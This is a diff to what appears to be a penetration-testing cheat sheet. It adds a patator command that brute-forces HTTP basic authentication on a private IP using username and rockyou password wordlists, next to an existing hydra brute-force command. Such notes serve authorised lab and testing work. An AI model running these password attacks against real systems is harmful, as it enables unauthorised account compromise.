@@ -21,6 +21,9 @@ ftp://
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.242.201 http-head /
 ```
+```
+patator http_fuzz auth_type=basic url=http://192.168.157.46:242/ user=FILE0 password=FILE1 0=./users.txt 1=/usr/share/wordlists/rockyou.txt -x ignore:code=401
+```
 
 
 # HTTP POST
